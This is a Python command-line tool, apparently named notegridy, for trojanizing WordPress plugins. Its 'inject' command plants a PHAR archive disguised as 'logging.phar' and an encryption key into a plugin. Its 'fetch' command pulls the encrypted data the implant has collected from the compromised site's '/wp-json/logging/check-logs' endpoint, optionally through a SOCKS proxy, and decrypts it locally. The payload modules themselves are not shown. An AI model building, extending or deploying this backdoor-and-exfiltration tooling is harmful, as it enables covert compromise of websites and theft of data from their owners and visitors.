from notegridy.decrypt import decrypt_res
from notegridy.injector import Injector
from notegridy.generate import generate_phar

import json
import click
import requests
from os import path, unlink
from nacl.public import PrivateKey, SealedBox


@click.group()
def cli():
    pass


@cli.command()
@click.argument("plugin_path", type=click.Path(exists=True))
@click.option(
    "--output_path",
    "-o",
    type=click.Path(
        exists=True,
        file_okay=False,
    ),
    help="Path to where the modified plugin and decryption key file should be placed.",
)
@click.option(
    "--achive_name",
    default="logging.phar",
    show_default=True,
    help="Name of the injected achive inside the modified plugin.",
)
@click.option(
    "--use-key-file",
    "key_file",
    type=click.File(
        "rb",
    ),
    help="Path to file containing a decryption key, this is used to derive a private key instead of generating a new private key.",
)
def inject(plugin_path, output_path, achive_name, key_file):
    if output_path == None:
        output_path = path.dirname(plugin_path)

    if key_file != None:
        private_key = PrivateKey(private_key=key_file.read())
        encryption_key = private_key.public_key
    else:
        private_key = PrivateKey.generate()
        with open(path.join(output_path, "key_file"), "wb") as key_file:
            key_file.write(private_key.encode())
        encryption_key = private_key.public_key

    with Injector(plugin_path, output_path) as injector:
        archive_path = path.join(output_path, achive_name)
        generate_phar(archive_path)

        injector.write_file(".key_file", encryption_key.encode())

        try:
            injector.inject_archive(archive_path)
        except Exception as err:
            click.echo(
                click.style("Error: ", fg="red") + f"{err}",
                err=True,
            )

        unlink(archive_path)


@cli.command()
@click.argument("url")
@click.option(
    "--socks-proxy", "-p", "proxy", help="Socks proxy to use when fetching logs."
)
@click.option(
    "--key-file",
    "-k",
    required=True,
    type=click.File("rb"),
    help="Path to file containing the key to decrypt the response.",
)
@click.option(
    "--output-file",
    "-o",
    type=click.File("w"),
    default="logs.json",
    help="File to write fetched results to",
)
def fetch(url, proxy, key_file, output_file):
    key_pair = load_key_pair_from_file(key_file)

    api_endpoint = f"{url}/wp-json/logging/check-logs"

    # set proxy object
    if proxy != None:
        proxies = {"http": proxy, "https": proxy}
    else:
        proxies = {}

    res = requests.get(api_endpoint, proxies).json()

    collected_data = decrypt_res(res, key_pair)

    click.echo(
        click.style("Fetched results: ", fg="green") + f"{len(collected_data)}",
        err=True,
    )

    json.dump(collected_data, output_file, indent=4)
    click.echo(
        click.style("Written logs to: ", fg="green") + f"{output_file.name}",
        err=True,
    )


def load_key_pair_from_file(file) -> SealedBox:
    """
    Load a key pair from the provided file
    """

    decryption_key = PrivateKey(private_key=file.read())
    key_pair = SealedBox(decryption_key)

    return key_pair
